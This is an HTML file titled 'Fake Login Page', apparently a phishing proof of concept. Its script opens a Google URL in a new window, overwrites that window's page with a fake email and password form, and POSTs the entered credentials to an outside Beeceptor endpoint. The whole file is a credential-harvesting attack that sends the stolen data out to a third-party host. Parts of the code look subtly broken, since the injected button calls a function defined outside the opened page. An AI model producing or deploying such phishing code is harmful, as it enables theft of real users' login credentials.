<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Login Page</title>
</head>
<body>
    <h1>Login Form</h1>

    <!-- Button to open the login page (spoofed page) -->
    <button onclick="go()">Go</button>

    <script>
        function go() {
            var x = window.open('https://www.google.com/csi'); // Open a target URL (Google)
            
            setTimeout(function() {
                // Change the body content of the opened window to simulate a fake login page
                x.document.body.innerHTML = '<h1>Please login</h1>';
                x.document.body.innerHTML += 'Email: <input id="email"><br>';
                x.document.body.innerHTML += 'Pass: <input id="pass" type="password"><br>';
                x.document.body.innerHTML += '<button onclick="sendData()">Login</button>';

                // Function to send the collected data without redirection
                function sendData() {
                    var email = document.getElementById('email').value;
                    var password = document.getElementById('pass').value;

                    // Check if both email and password are filled
                    if (email === "" || password === "") {
                        alert("Please enter both email and password.");
                        return; // Prevent sending empty data
                    }

                    // Send data to Beeceptor endpoint
                    fetch('https://hd59ac746144df72f574.free.beeceptor.com', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            email: email,
                            password: password
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        console.log("Data successfully sent:", data);
                        alert('Data has been sent to the server');
                    })
                    .catch(error => {
                        console.error("Error sending data:", error);
                        alert('There was an error sending the data');
                    });
                }
            }, 3000); // Wait for 3 seconds to simulate the page load time
        }
    </script>
</body>
</html>
